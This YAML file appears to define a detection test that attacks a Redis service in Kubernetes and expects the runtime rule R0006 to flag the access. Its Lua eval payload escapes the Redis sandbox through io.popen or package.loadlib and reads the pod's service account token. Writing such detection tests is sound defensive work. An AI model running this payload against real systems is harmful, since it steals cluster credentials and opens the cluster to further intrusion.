apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-02-sa-token-exfil
  description: "SA token exfiltration via Lua sandbox escape. Triggers R0006."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: sa-token-exfil
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo no_token')
        local out = f:read('*a')
        f:close()
        return out
    successIndicators:
      - responseContains: "eyJ"
expectedDetections:
  - attackType: fileless
    ruleID: R0006
    ruleName: "Unexpected service account token access"
    containerName: redis
    command: cat
